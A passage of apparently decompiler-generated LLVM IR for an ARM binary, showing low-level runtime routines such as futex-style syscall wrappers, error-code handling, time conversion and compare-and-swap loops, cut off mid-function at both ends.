  %v2_158a430 = phi i1 [ %v2_158a427, %dec_label_pc_15864 ], [ %v2_158a4, %dec_label_pc_15898 ]
  %v0_158c429 = phi i32 [ %arg2, %dec_label_pc_15864 ], [ %v0_158a4.pre, %dec_label_pc_15898 ]
  %v1_15944828 = phi i32 [ %v0_1587c, %dec_label_pc_15864 ], [ %v0_15898, %dec_label_pc_15898 ]
  br i1 %v2_158a430, label %dec_label_pc_1588c, label %dec_label_pc_158ac

dec_label_pc_158ac:                               ; preds = %dec_label_pc_158a4
  %v1_158ac = inttoptr i32 %v0_158c429 to i32*
  %v2_158ac = load i32, i32* %v1_158ac, align 4
  %v2_158b0 = icmp eq i32 %v2_158ac, 0
  store i1 %v2_158b0, i1* @cpsr_z, align 1
  br i1 %v2_158b0, label %dec_label_pc_1588c, label %dec_label_pc_158c4

dec_label_pc_158bc:                               ; preds = %dec_label_pc_15898
  br i1 %v2_158a4, label %dec_label_pc_15900, label %dec_label_pc_158bc.dec_label_pc_158c4_crit_edge

dec_label_pc_158bc.dec_label_pc_158c4_crit_edge:  ; preds = %dec_label_pc_158bc
  %.pre = inttoptr i32 %v0_158a4.pre to i32*
  br label %dec_label_pc_158c4

dec_label_pc_158c4:                               ; preds = %dec_label_pc_158ac, %dec_label_pc_158bc.dec_label_pc_158c4_crit_edge
  %v2_158cc.pre-phi = phi i32* [ %.pre, %dec_label_pc_158bc.dec_label_pc_158c4_crit_edge ], [ %v1_158ac, %dec_label_pc_158ac ]
  %v3_158cc = call i32 @function_15830(i32* %v2_158cc.pre-phi, i32 1)
  br label %dec_label_pc_15900

dec_label_pc_158d4:                               ; preds = %dec_label_pc_15904
  %v0_158d4 = load i32, i32* %r7.global-to-local, align 4
  %v5_158d8 = call i32 @function_1580c(i32 240, i32 %v0_15904, i32 %v0_15910, i32 %v2_15904, i32 %v0_158d4)
  %v4_158e0 = icmp eq i32 %v5_158d8, -38
  br i1 %v4_158e0, label %dec_label_pc_158e4, label %dec_label_pc_15904

dec_label_pc_158e4:                               ; preds = %dec_label_pc_158d4
  %v0_158e4 = load i32, i32* %r4.global-to-local, align 4
  %v0_158e8 = load i32, i32* @r6, align 4
  %v0_158ec = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_158ec, i32* %r2.global-to-local, align 4
  %v5_158f8 = call i32 @function_1580c(i32 240, i32 %v0_158e8, i32 %v0_158ec, i32 %v0_158e4, i32 %v0_158ec)
  br label %dec_label_pc_15904

dec_label_pc_15900:                               ; preds = %dec_label_pc_158bc, %dec_label_pc_158c4
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_15904

dec_label_pc_15904:                               ; preds = %dec_label_pc_158d4, %dec_label_pc_158e4, %dec_label_pc_15900
  %v0_15904 = load i32, i32* @r6, align 4
  %v1_15904 = inttoptr i32 %v0_15904 to i32*
  %v2_15904 = load i32, i32* %v1_15904, align 4
  store i32 %v2_15904, i32* %r4.global-to-local, align 4
  %v1_15908 = load i32, i32* @r8, align 4
  %v9_15908 = icmp eq i32 %v2_15904, %v1_15908
  %v0_15910 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v0_15910, i32* %r2.global-to-local, align 4
  br i1 %v9_15908, label %dec_label_pc_158d4, label %dec_label_pc_15920

dec_label_pc_15920:                               ; preds = %dec_label_pc_15904
  %v0_15920 = load i32, i32* @r5, align 4
  %v2_15920 = icmp eq i32 %v0_15920, 0
  store i1 %v2_15920, i1* @cpsr_z, align 1
  br i1 %v2_15920, label %dec_label_pc_1593c, label %dec_label_pc_15928

dec_label_pc_15928:                               ; preds = %dec_label_pc_15920
  store i32 %v3_15864, i32* @r4, align 4
  store i32 %v12_15864, i32* %r7.global-to-local, align 4
  store i32 %v15_15864, i32* @r8, align 4
  store i32 %v18_15864, i32* %sl.global-to-local, align 4
  store i32 %v21_15864, i32* @lr, align 4
  %v2_15938 = inttoptr i32 %v0_15920 to i32*
  %v3_15938 = call i32 @function_15830(i32* %v2_15938, i32 -1)
  br label %dec_label_pc_1593c

dec_label_pc_1593c:                               ; preds = %dec_label_pc_1588c, %dec_label_pc_15920, %dec_label_pc_15928
  %v1_15944 = phi i32 [ 240, %dec_label_pc_15920 ], [ %v3_15938, %dec_label_pc_15928 ], [ %v1_15944828, %dec_label_pc_1588c ]
  store i32 %v3_15864, i32* @r4, align 4
  store i32 %v6_15864, i32* @r5, align 4
  store i32 %v9_15864, i32* @r6, align 4
  store i32 %v12_15864, i32* @r7, align 4
  store i32 %v15_15864, i32* @r8, align 4
  store i32 %v18_15864, i32* @sl, align 4
  store i32 %v21_15864, i32* @lr, align 4
  ret i32 %v1_15944

; uselistorder directives
  uselistorder i32 %v0_15910, { 1, 0 }
  uselistorder i32 %v2_15904, { 1, 2, 0 }
  uselistorder i32 %v0_15904, { 1, 0 }
  uselistorder i32 %v0_158a4.pre, { 0, 2, 1 }
  uselistorder i32 %v21_15864, { 1, 0 }
  uselistorder i32 %v18_15864, { 1, 0 }
  uselistorder i32 %v15_15864, { 1, 0 }
  uselistorder i32 %v12_15864, { 1, 0 }
  uselistorder i32 %v3_15864, { 1, 0 }
  uselistorder i32* %sl.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r7.global-to-local, { 0, 3, 1, 2 }
  uselistorder i32* %r4.global-to-local, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 1, 4, 3, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @function_1580c, { 1, 0 }
  uselistorder label %dec_label_pc_1593c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15904, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15900, { 1, 0 }
  uselistorder label %dec_label_pc_158c4, { 1, 0 }
  uselistorder label %dec_label_pc_158a4, { 1, 0 }
}

define i32 @function_15948() local_unnamed_addr {
dec_label_pc_15948:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_15948 = load i32, i32* @r0, align 4
  %v0_1594c = load i32, i32* @r7, align 4
  store i32 %v0_1594c, i32* %stack_var_-4, align 4
  %v0_15950 = load i32, i32* @r2, align 4
  store i32 %v0_15950, i32* @ip, align 4
  %tmp = icmp ugt i32 %v0_15948, 2
  br i1 %tmp, label %.thread7, label %dec_label_pc_1595c

.thread7:                                         ; preds = %dec_label_pc_15948
  store i32 22, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15998

dec_label_pc_1595c:                               ; preds = %dec_label_pc_15948
  %v1_15968 = sub i32 0, %v0_15948
  store i32 %v1_15968, i32* %r0.global-to-local, align 4
  %v1_1596c = add i32 %v0_15948, 1
  %v2_1596c = icmp ult i32 %v1_15968, 2
  br i1 %v2_1596c, label %bb11, label %bb

bb:                                               ; preds = %dec_label_pc_1595c
  br label %bb11

bb11:                                             ; preds = %dec_label_pc_1595c, %bb
  %storemerge = phi i32 [ 0, %bb ], [ %v1_1596c, %dec_label_pc_1595c ]
  %v0_1597c.pr = phi i32 [ 0, %bb ], [ %v1_1596c, %dec_label_pc_1595c ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  %v2_15974 = icmp eq i32 %v0_15950, 0
  br i1 %v2_15974, label %.thread, label %bb12

.thread:                                          ; preds = %bb11
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15998

bb12:                                             ; preds = %bb11
  %v2_1597c = icmp eq i32 %v0_1597c.pr, 0
  br i1 %v2_1597c, label %dec_label_pc_15998, label %dec_label_pc_15984

dec_label_pc_15984:                               ; preds = %bb12
  %v1_15984 = inttoptr i32 %v0_15950 to i32*
  %v2_15984 = load i32, i32* %v1_15984, align 4
  %v1_15988 = add i32 %v0_15950, 4
  %v2_15988 = inttoptr i32 %v1_15988 to i32*
  %v3_15988 = load i32, i32* %v2_15988, align 4
  %tmp13 = bitcast i32 %v2_15984 to float
  %tmp14 = call float @fabsf(float %tmp13)
  %v1_1598c = bitcast float %tmp14 to i32
  %v1_15990 = and i32 %v3_15988, -4
  store i32 %v1_15990, i32* %r3.global-to-local, align 4
  store i32 %v1_1598c, i32* %v1_15984, align 4
  %v5_15994 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v5_15994, i32* %v2_15988, align 4
  %v2_15998.pre = load i32, i32* %stack_var_-4, align 4
  %v1_1599c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15998

dec_label_pc_15998:                               ; preds = %.thread7, %.thread, %bb12, %dec_label_pc_15984
  %v1_1599c = phi i32 [ %v1_15968, %.thread ], [ %v1_15968, %bb12 ], [ %v1_1599c.pre, %dec_label_pc_15984 ], [ 22, %.thread7 ]
  %v2_15998 = phi i32 [ %v0_1594c, %.thread ], [ %v0_1594c, %bb12 ], [ %v2_15998.pre, %dec_label_pc_15984 ], [ %v0_1594c, %.thread7 ]
  store i32 %v2_15998, i32* @r7, align 4
  ret i32 %v1_1599c

; uselistorder directives
  uselistorder i32 %v0_15948, { 1, 2, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_15998, { 3, 2, 1, 0 }
  uselistorder label %bb11, { 1, 0 }
}

define i32 @function_159a0(i32 %arg1) local_unnamed_addr {
dec_label_pc_159a0:
  %stack_var_-16 = alloca i32, align 4
  %v2_159a4 = ptrtoint i32* %stack_var_-16 to i32
  %v2_159b0 = call i32 @function_15a10(i32 2, i32 %v2_159a4)
  %v2_159b4 = icmp eq i32 %v2_159b0, 0
  br i1 %v2_159b4, label %dec_label_pc_159bc, label %dec_label_pc_159fc

dec_label_pc_159bc:                               ; preds = %dec_label_pc_159a0
  %v2_159bc = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_159bc, i32* @r4, align 4
  %v10_159c8 = icmp sgt i32 %v2_159bc, 2147
  br i1 %v10_159c8, label %dec_label_pc_159fc, label %dec_label_pc_159cc

dec_label_pc_159cc:                               ; preds = %dec_label_pc_159bc
  store i32 1000, i32* @r1, align 4
  %v0_159d4 = call i32 @function_12a80()
  %v0_159e0 = load i32, i32* @r4, align 4
  %v2_159e0 = mul i32 %v0_159e0, 1000000
  %v2_159e8 = sub i32 2147483647, %v2_159e0
  %v7_159f0 = icmp sgt i32 %v0_159d4, %v2_159e8
  %v10_159f04 = add i32 %v2_159e0, %v0_159d4
  %.v10_159f04 = select i1 %v7_159f0, i32 -1, i32 %v10_159f04
  br label %dec_label_pc_159fc

dec_label_pc_159fc:                               ; preds = %dec_label_pc_159cc, %dec_label_pc_159bc, %dec_label_pc_159a0
  %storemerge = phi i32 [ -1, %dec_label_pc_159a0 ], [ -1, %dec_label_pc_159bc ], [ %.v10_159f04, %dec_label_pc_159cc ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 2147483647, { 4, 6, 0, 1, 2, 3, 5 }
}

define i32 @function_15a08(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_15a08:
  %v0_15a08 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_15a08, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_15a08
  %v3_15a08 = udiv i32 %arg2, 65536
  %v4_15a08 = mul i32 %arg2, 65536
  %v5_15a08 = or i32 %v3_15a08, %v4_15a08
  %v8_15a08 = and i32 %v5_15a08, %arg1
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_15a08, %bb
  %v6_15a0c = phi i32 [ %arg1, %dec_label_pc_15a08 ], [ %v8_15a08, %bb ]
  ret i32 %v6_15a0c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_15a10(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_15a10:
  %r4.global-to-local = alloca i32, align 4
  %v6_15a10 = load i32, i32* @r5, align 4
  %v9_15a10 = load i32, i32* @r6, align 4
  %v12_15a10 = load i32, i32* @r7, align 4
  %v2_15a18 = load i32, i32* @global_var_22818.613, align 4
  %v2_15a1c = icmp eq i32 %v2_15a18, 0
  store i32 %arg1, i32* @r6, align 4
  store i32 %arg2, i32* @r7, align 4
  br i1 %v2_15a1c, label %dec_label_pc_15a30, label %dec_label_pc_15a70

dec_label_pc_15a30:                               ; preds = %dec_label_pc_15a10
  %v4_15a38 = call i32 @function_16904(i32 ptrtoint ([10 x i8]* @global_var_1a004.615 to i32), i32 ptrtoint ([21 x i8]* @global_var_1a010.617 to i32))
  %v2_15a40 = icmp eq i32 %v4_15a38, 0
  store i1 %v2_15a40, i1* @cpsr_z, align 1
  %storemerge = select i1 %v2_15a40, i32 ptrtoint (i32* @global_var_15aa4.619 to i32), i32 %v4_15a38
  store i32 %storemerge, i32* %r4.global-to-local, align 4
  %v4_15a5813 = call i32 @function_15d38(i32 0, i32 %storemerge, i32* nonnull @global_var_22818.613)
  %v2_15a5c15 = icmp eq i32 %v4_15a5813, 0
  %v2_15a78.pre.pre16 = load i32, i32* @global_var_22818.613, align 4
  br i1 %v2_15a5c15, label %dec_label_pc_15a70.loopexit, label %dec_label_pc_15a64

dec_label_pc_15a64:                               ; preds = %dec_label_pc_15a30, %dec_label_pc_15a64._crit_edge
  %v2_15a78.pre.pre17 = phi i32 [ %v2_15a78.pre.pre, %dec_label_pc_15a64._crit_edge ], [ %v2_15a78.pre.pre16, %dec_label_pc_15a30 ]
  %v2_15a68 = icmp eq i32 %v2_15a78.pre.pre17, 0
  store i1 %v2_15a68, i1* @cpsr_z, align 1
  br i1 %v2_15a68, label %dec_label_pc_15a64._crit_edge, label %dec_label_pc_15a70.loopexit

dec_label_pc_15a64._crit_edge:                    ; preds = %dec_label_pc_15a64
  %v0_15a50.pre = load i32, i32* %r4.global-to-local, align 4
  %v4_15a58 = call i32 @function_15d38(i32 0, i32 %v0_15a50.pre, i32* nonnull @global_var_22818.613)
  %v2_15a5c = icmp eq i32 %v4_15a58, 0
  %v2_15a78.pre.pre = load i32, i32* @global_var_22818.613, align 4
  br i1 %v2_15a5c, label %dec_label_pc_15a70.loopexit, label %dec_label_pc_15a64

dec_label_pc_15a70.loopexit:                      ; preds = %dec_label_pc_15a64, %dec_label_pc_15a64._crit_edge, %dec_label_pc_15a30
  %v2_15a78.pre.pre.lcssa = phi i32 [ %v2_15a78.pre.pre16, %dec_label_pc_15a30 ], [ %v2_15a78.pre.pre, %dec_label_pc_15a64._crit_edge ], [ %v2_15a78.pre.pre17, %dec_label_pc_15a64 ]
  %v0_15a74.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_15a70

dec_label_pc_15a70:                               ; preds = %dec_label_pc_15a70.loopexit, %dec_label_pc_15a10
  %v2_15a78 = phi i32 [ %v2_15a78.pre.pre.lcssa, %dec_label_pc_15a70.loopexit ], [ %v2_15a18, %dec_label_pc_15a10 ]
  %v0_15a74 = phi i32 [ %v0_15a74.pre, %dec_label_pc_15a70.loopexit ], [ %arg1, %dec_label_pc_15a10 ]
  call void @__pseudo_branch(i32 %v2_15a78)
  store i32 %v6_15a10, i32* @r5, align 4
  store i32 %v9_15a10, i32* @r6, align 4
  store i32 %v12_15a10, i32* @r7, align 4
  ret i32 %v0_15a74

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32* @global_var_22818.613, { 2, 3, 0, 1, 4 }
  uselistorder label %dec_label_pc_15a70.loopexit, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15a64, { 1, 0 }
}

define i32 @function_15aa4(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_15aa4:
  %v2_15ab8 = icmp eq i32 %arg1, 0
  br i1 %v2_15ab8, label %dec_label_pc_15b10, label %dec_label_pc_15ac0

dec_label_pc_15ac0:                               ; preds = %dec_label_pc_15aa4
  %v4_15ac4 = icmp eq i32 %arg1, -38
  br i1 %v4_15ac4, label %bb, label %dec_label_pc_15b00

bb:                                               ; preds = %dec_label_pc_15ac0
  br label %dec_label_pc_15b00

dec_label_pc_15b00:                               ; preds = %dec_label_pc_15ac0, %bb
  %storemerge = phi i32 [ -22, %bb ], [ %arg1, %dec_label_pc_15ac0 ]
  %v0_15b00 = call i32 @function_12f18()
  %v1_15b04 = sub i32 0, %storemerge
  %v2_15b08 = inttoptr i32 %v0_15b00 to i32*
  store i32 %v1_15b04, i32* %v2_15b08, align 4
  br label %dec_label_pc_15b10

dec_label_pc_15b10:                               ; preds = %dec_label_pc_15aa4, %dec_label_pc_15b00
  %v1_15b14 = phi i32 [ 0, %dec_label_pc_15aa4 ], [ -1, %dec_label_pc_15b00 ]
  ret i32 %v1_15b14

; uselistorder directives
  uselistorder i32 -22, { 2, 0, 1, 3 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15b10, { 1, 0 }
  uselistorder label %dec_label_pc_15b00, { 1, 0 }
}

define i32 @function_15b1c(i32* %arg1) local_unnamed_addr {
dec_label_pc_15b1c:
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_15b1c = load i32, i32* @r4, align 4
  %v2_15b20 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %tmp, i32* @r4, align 4
  %v2_15b30 = call i32 @function_15a10(i32 0, i32 %v2_15b20)
  %v0_15b34 = load i32, i32* @r4, align 4
  %v2_15b34 = icmp eq i32 %v0_15b34, 0
  br i1 %v2_15b34, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_15b1c
  %v3_15b38 = load i32, i32* %stack_var_-16, align 4
  %v3_15b3c = inttoptr i32 %v0_15b34 to i32*
  store i32 %v3_15b38, i32* %v3_15b3c, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_15b1c, %bb
  %v2_15b40 = load i32, i32* %stack_var_-16, align 4
  store i32 %v3_15b1c, i32* @r4, align 4
  ret i32 %v2_15b40

; uselistorder directives
  uselistorder i32 (i32, i32)* @function_15a10, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_15b50(i32 %arg1) local_unnamed_addr {
dec_label_pc_15b50:
  %v0_15b5c = call i32 @function_131c4()
  ret i32 %v0_15b5c
}

define i32 @function_15b68() local_unnamed_addr {
dec_label_pc_15b68:
  %v1_15b68 = load i32, i32* @r0, align 4
  ret i32 %v1_15b68
}

define i32 @function_15b6c(i32 %arg1) local_unnamed_addr {
dec_label_pc_15b6c:
  %v0_15b6c = load i32, i32* @lr, align 4
  store i32 88960, i32* @lr, align 4
  %v1_15b7c = call i32 @function_15b68()
  store i32 0, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  %v3_15ba0 = call i32 @function_157a0(i32 6, i32 %v1_15b7c, i32 0)
  %v7_15ba4 = icmp eq i32 %v3_15ba0, -4
  br i1 %v7_15ba4, label %bb, label %bb5

bb:                                               ; preds = %dec_label_pc_15b6c
  br label %bb5

bb5:                                              ; preds = %dec_label_pc_15b6c, %bb
  %storemerge = phi i32 [ 0, %bb ], [ %v3_15ba0, %dec_label_pc_15b6c ]
  store i32 %storemerge, i32* @r0, align 4
  %v0_15bac = call i32 @function_131c4()
  store i32 %v0_15b6c, i32* @lr, align 4
  ret i32 %v0_15bac

; uselistorder directives
  uselistorder label %bb5, { 1, 0 }
}

define i32 @function_15bc0(i32 %arg1) local_unnamed_addr {
dec_label_pc_15bc0:
  %v1_15bd0 = load i32, i32* @r0, align 4
  ret i32 %v1_15bd0
}

define i32 @function_15bd4() local_unnamed_addr {
dec_label_pc_15bd4:
  %v1_15be4 = load i32, i32* @r0, align 4
  ret i32 %v1_15be4
}

define i32 @function_15be8(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_15be8:
  store i32 %arg3, i32* @r3, align 4
  store i32 %arg2, i32* @r2, align 4
  %v3_15c14 = call i32 @function_157a0(i32 3, i32 %arg1, i32 %arg2)
  store i32 %v3_15c14, i32* @r0, align 4
  %v0_15c18 = call i32 @function_131c4()
  ret i32 %v0_15c18

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0 }
}

define i32 @function_15c28(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_15c28:
  %v0_15c34 = call i32 @function_131c4()
  ret i32 %v0_15c34
}

define i32 @function_15c40(i32 %arg1) local_unnamed_addr {
dec_label_pc_15c40:
  %v0_15c4c = call i32 @function_131c4()
  ret i32 %v0_15c4c
}

define i32 @function_15c58(i32 %arg1) local_unnamed_addr {
dec_label_pc_15c58:
  %stack_var_-16 = alloca i32, align 4
  %v2_15c5c = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg1, i32* %stack_var_-16, align 4
  %v2_15c74 = call i32 @function_16fac(i32 %v2_15c5c, i32 %v2_15c5c)
  %v2_15c78 = icmp eq i32 %v2_15c74, 0
  br i1 %v2_15c78, label %bb5, label %bb

bb:                                               ; preds = %dec_label_pc_15c58
  %v3_15c7c = load i32, i32* %stack_var_-16, align 4
  br label %bb5

bb5:                                              ; preds = %dec_label_pc_15c58, %bb
  %v1_15c88 = phi i32 [ 0, %dec_label_pc_15c58 ], [ %v3_15c7c, %bb ]
  ret i32 %v1_15c88

; uselistorder directives
  uselistorder label %bb5, { 1, 0 }
}

define i32 @function_15c8c(i32 %arg1) local_unnamed_addr {
dec_label_pc_15c8c:
  %v0_15c98 = call i32 @function_131c4()
  ret i32 %v0_15c98
}

define i32 @function_15ca4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_15ca4:
  store i32 %arg3, i32* @r3, align 4
  store i32 %arg2, i32* @r2, align 4
  %v3_15cd0 = call i32 @function_157a0(i32 4, i32 %arg1, i32 %arg2)
  store i32 %v3_15cd0, i32* @r0, align 4
  %v0_15cd4 = call i32 @function_131c4()
  ret i32 %v0_15cd4

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0 }
}

define i32 @function_15ce4() local_unnamed_addr {
dec_label_pc_15ce4:
  call void @__pseudo_branch(i32 ptrtoint (i32* @global_var_15cf4.625 to i32))
  %v0_15cf0 = load i1, i1* @cpsr_z, align 1
  %v1_15cf0 = load i32, i32* @r0, align 4
  br i1 %v0_15cf0, label %bb, label %dec_label_pc_15ce4._crit_edge

bb:                                               ; preds = %dec_label_pc_15ce4
  br label %dec_label_pc_15ce4._crit_edge

dec_label_pc_15ce4._crit_edge:                    ; preds = %dec_label_pc_15ce4, %bb
  %v0_15cf4 = load i32, i32* @lr, align 4
  %v1_15cf4 = urem i32 %v0_15cf4, 2
  %v2_15cf4 = icmp eq i32 %v1_15cf4, 0
  store i1 %v2_15cf4, i1* @cpsr_z, align 1
  ret i32 %v1_15cf0

; uselistorder directives
  uselistorder label %dec_label_pc_15ce4._crit_edge, { 1, 0 }
}

define i32 @function_15d00(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_15d00:
  %v1_15d14 = call i32 @unknown_ffff0fc0()
  ret i32 %arg1
}

define i32 @function_15d38(i32 %arg1, i32 %arg2, i32* %arg3) local_unnamed_addr {
dec_label_pc_15d38:
  %v3_15d3c = load i32, i32* @global_var_2234c.628, align 4
  store i32 %v3_15d3c, i32* @ip, align 4
  call void @__pseudo_branch(i32 ptrtoint (i32* @global_var_15d48.629 to i32))
  %v0_15d44 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_15d44, label %bb, label %bb1

bb:                                               ; preds = %dec_label_pc_15d38
  %v2_15d44 = load i32, i32* @r8, align 4
  %v5_15d44 = mul i32 %v2_15d44, 4096
  %v6_15d44 = and i32 %v5_15d44, %arg1
  store i32 %v6_15d44, i32* @ip, align 4
  br label %bb1

bb1:                                              ; preds = %dec_label_pc_15d38, %bb
  %v2_15d4c = load i32, i32* %arg3, align 4
  %v2_15d50 = sub i32 %arg1, %v2_15d4c
  %v9_15d50 = icmp eq i32 %v2_15d4c, %arg1
  br i1 %v9_15d50, label %bb2, label %bb3

bb2:                                              ; preds = %bb1
  store i32 %arg2, i32* %arg3, align 4
  br label %bb3

bb3:                                              ; preds = %bb1, %bb2
  ret i32 %v2_15d50

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %bb3, { 1, 0 }
  uselistorder label %bb1, { 1, 0 }
}

define i32 @function_15d64(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_15d64:
  br label %dec_label_pc_15d6c

dec_label_pc_15d6c:                               ; preds = %bb, %dec_label_pc_15d64
  %v2_15d6c = load i32, i32* %arg2, align 4
  %v2_15d70 = sub i32 %arg1, %v2_15d6c
  %v9_15d70 = icmp eq i32 %v2_15d6c, %arg1
  br i1 %v9_15d70, label %bb, label %dec_label_pc_15d80

bb:                                               ; preds = %dec_label_pc_15d6c
  %v4_15d78 = icmp eq i32 %v2_15d70, 1
  br i1 %v4_15d78, label %dec_label_pc_15d6c, label %dec_label_pc_15d80

dec_label_pc_15d80:                               ; preds = %dec_label_pc_15d6c, %bb
  ret i32 %v2_15d70

; uselistorder directives
  uselistorder i32 %v2_15d70, { 1, 0 }
  uselistorder label %dec_label_pc_15d80, { 1, 0 }
}

define i32 @function_15d88(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_15d88:
  br label %dec_label_pc_15d90

dec_label_pc_15d90:                               ; preds = %bb, %dec_label_pc_15d88
  %v2_15d90 = load i32, i32* %arg2, align 4
  %v2_15d94 = sub i32 %arg1, %v2_15d90
  %v9_15d94 = icmp eq i32 %v2_15d90, %arg1
  br i1 %v9_15d94, label %bb, label %dec_label_pc_15da4

bb:                                               ; preds = %dec_label_pc_15d90
  %v4_15d9c = icmp eq i32 %v2_15d94, 1
  br i1 %v4_15d9c, label %dec_label_pc_15d90, label %dec_label_pc_15da4

dec_label_pc_15da4:                               ; preds = %dec_label_pc_15d90, %bb
  ret i32 %v2_15d94

; uselistorder directives
  uselistorder i32 %v2_15d94, { 1, 0 }
  uselistorder label %dec_label_pc_15da4, { 1, 0 }
}

define i32 @function_15dac() local_unnamed_addr {
dec_label_pc_15dac:
  %v3_15db0 = load i32, i32* @global_var_22350.631, align 4
  call void @__pseudo_branch(i32 ptrtoint (i32* @global_var_15dbc.632 to i32))
  ret i32 %v3_15db0
}

define i32 @function_15dc8() local_unnamed_addr {
dec_label_pc_15dc8:
  %v2_15dcc = load i32, i32* @global_var_22b64.634, align 4
  %v2_15dd0 = icmp eq i32 %v2_15dcc, 0
  %v0_15dd4 = load i32, i32* @r0, align 4
  store i32 %v0_15dd4, i32* @ip, align 4
  br i1 %v2_15dd0, label %dec_label_pc_15e28, label %dec_label_pc_15de4

dec_label_pc_15de4:                               ; preds = %dec_label_pc_15dc8
  %v3_15de4 = load i32, i32* @global_var_22b70.635, align 4
  %v1_15de8 = add i32 %v0_15dd4, 8
  %v2_15df0 = sub i32 -220, %v0_15dd4
  %v1_15df4 = add i32 %v3_15de4, -1
  %v2_15df8 = and i32 %v1_15df4, %v2_15df0
  %v2_15dfc = add i32 %v1_15de8, %v2_15df8
  store i32 %v2_15dfc, i32* @r4, align 4
  %v1_15e00 = add i32 %v2_15dfc, 212
  store i32 1, i32* @r3, align 4
  %v2_15e08 = inttoptr i32 %v0_15dd4 to i32*
  store i32 1, i32* %v2_15e08, align 4
  %v1_15e0c = load i32, i32* @ip, align 4
  %v2_15e0c = add i32 %v1_15e0c, 4
  %v3_15e0c = inttoptr i32 %v2_15e0c to i32*
  store i32 %v1_15e00, i32* %v3_15e0c, align 4
  %v3_15e10 = load i32, i32* @global_var_22b68.636, align 4
  %v0_15e14 = load i32, i32* @ip, align 4
  %v1_15e14 = load i32, i32* @r4, align 4
  %v2_15e14 = add i32 %v1_15e14, 208
  %v3_15e14 = inttoptr i32 %v2_15e14 to i32*
  store i32 %v0_15e14, i32* %v3_15e14, align 4
  %v0_15e18 = load i32, i32* @ip, align 4
  %v1_15e18 = load i32, i32* @r4, align 4
  %v2_15e18 = add i32 %v1_15e18, 4
  %v3_15e18 = inttoptr i32 %v2_15e18 to i32*
  store i32 %v0_15e18, i32* %v3_15e18, align 4
  %v2_15e1c = load i32, i32* @global_var_22b64.634, align 4
  %v3_15e20 = inttoptr i32 %v1_15e00 to i16*
  %v4_15e20 = call i32 @function_1513c(i16* %v3_15e20, i32 %v2_15e1c, i32 %v3_15e10)
  %v0_15e24 = load i32, i32* @r4, align 4
  br label %dec_label_pc_15e28

dec_label_pc_15e28:                               ; preds = %dec_label_pc_15dc8, %dec_label_pc_15de4
  %v1_15e2c = phi i32 [ %v0_15dd4, %dec_label_pc_15dc8 ], [ %v0_15e24, %dec_label_pc_15de4 ]
  ret i32 %v1_15e2c

; uselistorder directives
  uselistorder i32 %v0_15dd4, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_15e28, { 1, 0 }
}

define i32 @function_15e34(i32 %arg1) local_unnamed_addr {
dec_label_pc_15e34:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v6_15e34 = load i32, i32* @r5, align 4
  %v1_15e38 = add i32 %arg1, 12
  %v2_15e38 = inttoptr i32 %v1_15e38 to i32*
  %v3_15e38 = load i32, i32* %v2_15e38, align 4
  %v1_15e40 = add i32 %arg1, 20
  %v2_15e40 = inttoptr i32 %v1_15e40 to i32*
  %v3_15e40 = load i32, i32* %v2_15e40, align 4
  store i32 %v3_15e40, i32* @lr, align 4
  store i32 0, i32* @r4, align 4
  %v2_15e785 = icmp eq i32 %v3_15e40, 0
  br i1 %v2_15e785, label %dec_label_pc_15e80.thread, label %dec_label_pc_15e50.lr.ph

dec_label_pc_15e80.thread:                        ; preds = %dec_label_pc_15e34
  br label %dec_label_pc_15e80.dec_label_pc_15eb0_crit_edge

dec_label_pc_15e50.lr.ph:                         ; preds = %dec_label_pc_15e34
